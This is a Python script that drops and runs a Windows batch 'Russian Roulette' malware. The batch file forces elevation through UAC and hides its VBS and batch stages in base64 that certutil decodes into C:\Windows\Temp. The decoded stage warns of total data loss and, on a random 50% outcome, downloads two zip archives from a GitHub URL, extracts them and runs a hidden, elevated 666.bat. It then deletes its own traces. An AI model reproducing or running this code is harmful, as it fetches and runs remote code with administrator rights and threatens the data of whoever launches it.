import os

def die_or_survive():

    if os.path.exists("payload.bat"):
        os.system("del payload.bat")

    x = ("""
@echo off 
title Russian Roulette by Phoenixthrush
color a

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
cd %~dp0

echo V1NjcmlwdC5TbGVlcCg1MDAwKQ0Kc2V0IFdzaFNoZWxsID0gd3NjcmlwdC5jcmVh > tmp.b64
echo dGVvYmplY3QoIldTY3JpcHQuc2hlbGwiKQ0KV3NoU2hlbGwucnVuICIiIkM6XFdp >> tmp.b64
echo bmRvd3NcVGVtcFxtYWluLmJhdCIiICIsIDEsIHRydWU= >> tmp.b64

echo QGVjaG8gb2ZmDQoNCjo6IG1haW4uYmF0DQoNCmlmIG5vdCAiJTEiPT0iYW1fYWRt >> main.b64
echo aW4iIChwb3dlcnNoZWxsIHN0YXJ0IC12ZXJiIHJ1bmFzICclMCcgYW1fYWRtaW4g >> main.b64
echo JiBleGl0IC9iKQ0KDQpkZWwgL3EgQzpcV2luZG93c1xUZW1wXHRtcC52YnMgPm51 >> main.b64
echo bA0KDQpzZXQgL2EgcmFuZD0lcmFuZG9tJSAlJSAyICsgMQ0KDQo6bWVudWUNCmVj >> main.b64
echo aG8gWW91IGhhdmUgYSA1MCBwZXJjZW50IGNoYW5jZSB0byBzdXJ2aXZlIQ0KZWNo >> main.b64
echo byBJZiB5b3UgZmFpbCwgYWxsIHlvdXIgZGF0YSB3aWxsIGJlIGxvc3QhDQplY2hv >> main.b64
echo Lg0Kc2V0IC9wIGFzdz0iRG8geW91IHJlYWxseSB3YW50IHRvIGNvbnRpbnVlPyBb >> main.b64
echo eS9uXSAiDQoNCmlmICVhc3clPT15IChnb3RvIGNvbnRpbnVlKQ0KaWYgJWFzdyU9 >> main.b64
echo PW4gKGdvdG8gZXhpdCkgZWxzZSAoZ290byBtZW51ZSkNCmV4aXQNCg0KOmNvbnRp >> main.b64
echo bnVlDQppZiAlcmFuZCU9PTEgKGdvdG8gZnVja2VkKQ0KaWYgJXJhbmQlPT0yIChn >> main.b64
echo b3RvIGx1Y2spDQpleGl0DQoNCjpmdWNrZWQNCmNscw0KDQpiaXRzYWRtaW4gL3Ry >> main.b64
echo YW5zZmVyIG15ZG93bmxvYWRqb2IgL2Rvd25sb2FkIC9wcmlvcml0eSBmb3JlZ3Jv >> main.b64
echo dW5kICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUGhvZW5peHRo >> main.b64
echo cnVzaC9waG9lbml4dGhydXNoLmdpdGh1Yi5pby9tYXN0ZXIvc2l0ZXMvYXNzZXRz >> main.b64
echo L3JpY2suemlwIiAiQzpcV2luZG93c1xUZW1wXHJpY2suemlwIiA+bnVsDQpiaXRz >> main.b64
echo YWRtaW4gL3RyYW5zZmVyIG15ZG93bmxvYWRqb2IgL2Rvd25sb2FkIC9wcmlvcml0 >> main.b64
echo eSBmb3JlZ3JvdW5kICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20v >> main.b64
echo UGhvZW5peHRocnVzaC9waG9lbml4dGhydXNoLmdpdGh1Yi5pby9tYXN0ZXIvc2l0 >> main.b64
echo ZXMvYXNzZXRzLzY2Ni56aXAiICJDOlxXaW5kb3dzXFRlbXBcNjY2LnppcCIgPm51 >> main.b64
echo bA0KcG93ZXJzaGVsbCAtYyAiRXhwYW5kLUFyY2hpdmUgQzpcV2luZG93c1xUZW1w >> main.b64
echo XHJpY2suemlwICV1c2VycHJvZmlsZSVcRGVza3RvcCIgPm51bA0KcG93ZXJzaGVs >> main.b64
echo bCAtYyAiRXhwYW5kLUFyY2hpdmUgQzpcV2luZG93c1xUZW1wXDY2Ni56aXAgQzpc >> main.b64
echo V2luZG93c1xUZW1wIiA+bnVsDQoNCmRlbCAvcSBDOlxXaW5kb3dzXFRlbXBcNjY2 >> main.b64
echo LnppcCA+bnVsDQpzdGFydCAiIiAiJXVzZXJwcm9maWxlJVxEZXNrdG9wXHJpY2su >> main.b64
echo bXA0Ig0KdGltZW91dCAyIC9ub2JyZWFrID5udWwNCnBvd2Vyc2hlbGwgLWMgIlN0 >> main.b64
echo YXJ0LVByb2Nlc3MgLVZlcmIgUnVuQXMgLVdpbmRvd1N0eWxlIGhpZGRlbiBDOlxX >> main.b64
echo aW5kb3dzXFRlbXBccHJvY2Vzcy5iYXQiDQpleGl0DQoNCjpsdWNrDQpjbHMNCmVj >> main.b64
echo aG8geW91IHN1cnZpdmVkIQ0KZWNobyBNYXliZSBzZWUgeWEgbGF0ZXIhDQpwYXVz >> main.b64
echo ZSA+bnVsDQpkZWwgL3EgQzpcV2luZG93c1xUZW1wXHByb2Nlc3MuYmF0ID5udWwN >> main.b64
echo CnN0YXJ0IC9iICIiIGNtZCAvYyBkZWwgIiV+ZjAiICYmIHRhc2traWxsIC9pbSBj >> main.b64
echo bWQuZXhlIC9m >> main.b64

echo QGVjaG8gb2ZmDQoNCjpsb29wDQpmb3IgL0YgJSV4IElOICgndGFza2xpc3QgL05I > process.b64
echo IC9GSSAiSU1BR0VOQU1FIGVxIE1pY3Jvc29mdC5QaG90b3MuZXhlIicpIERPIElG >> process.b64
echo ICUleCA9PSBNaWNyb3NvZnQuUGhvdG9zLmV4ZSBnb3RvIGZvdW5kIGVsc2UNCnBv >> process.b64
echo d2Vyc2hlbGwgLWMgIlN0YXJ0LVByb2Nlc3MgLVZlcmIgUnVuQXMgLVdpbmRvd1N0 >> process.b64
echo eWxlIGhpZGRlbiBDOlxXaW5kb3dzXFRlbXBcNjY2LmJhdCINCnRpbWVvdXQgMyA+ >> process.b64
echo bnVsDQpleGl0DQoNCjpmb3VuZA0KZ290byBsb29w >> process.b64

certutil -decode "tmp.b64" "tmp.vbs" >nul
certutil -decode "main.b64" "main.bat" >nul 
certutil -decode "process.b64" "process.bat" >nul

del /q tmp.b64 >nul
del /q main.b64 >nul
del /q process.b64 >nul

copy "%~dp0\\tmp.vbs" "C:\\Windows\\Temp\" >nul
copy "%~dp0\\main.bat" "C:\\Windows\\Temp\" >nul
copy "%~dp0\\process.bat" "C:\\Windows\\Temp\" >nul

del /q tmp.vbs >nul
del /q main.bat >nul
del /q process.bat >nul

start "" "C:\Windows\Temp\\tmp.vbs"
start /b "" cmd /c del "%~f0" && taskkill /im cmd.exe /f

    """)

    text = open("payload.bat","x")
    text.write(x)
    text.close()

    os.system("start \"\" \"payload.bat\"")
    exit()

die_or_survive()